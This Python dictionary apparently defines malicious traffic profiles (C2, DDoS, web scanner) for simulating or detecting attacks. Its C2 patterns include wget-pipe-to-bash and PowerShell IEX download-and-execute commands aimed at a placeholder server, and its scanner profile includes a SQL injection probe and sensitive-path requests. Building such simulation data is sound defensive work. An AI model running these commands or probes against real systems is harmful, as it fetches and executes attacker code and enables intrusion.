MALICIOUS_PROFILES = {
    # Command & Control (C2) traffic
    "c2": {
        "ips": ['45.83.64.197', '185.220.101.45'],  # Common VPN/Proxy exit nodes
        "paths": ['/update/check', '/api/payload.bin'],
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "curl/8.1.2"
        ],
        "patterns": [
            "wget -qO- http://{C2_SERVER}/update.sh | bash",
            "powershell -exec bypass -nop -c IEX (New-Object Net.WebClient).DownloadString('http://{C2_SERVER}/payload.ps1')"
        ]
    },
    
    # DDoS attack pattern
    "ddos": {
        "ips": ['192.168.1.{}'.format(i) for i in range(10, 250)] + 
               ['185.156.177.32', '103.207.36.101'],  # Some known botnet sources
        "paths": ['/', '/login', '/api/auth', '/search?q=random'],
        "user_agents": [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
            "Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
        ],
        "patterns": [
            "GET {} HTTP/1.1",
            "POST {} HTTP/1.1"
        ]
    },
    
    # Web scanner profile
    "scanner": {
        "ips": ['62.102.148.67', '194.5.249.48'],  # Typical scanning services or proxies
        "paths": ['/admin/', '/robots.txt', '/.git/config', '/config.php', '/phpmyadmin'],
        "user_agents": [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "sqlmap/1.5.2#stable (http://sqlmap.org)"
        ],
        "patterns": [
            "GET /?id=1' OR '1'='1 HTTP/1.1",
            "HEAD / HTTP/1.1",
            "GET /wp-json/wp/v2/users HTTP/1.1"
        ]
    }
}
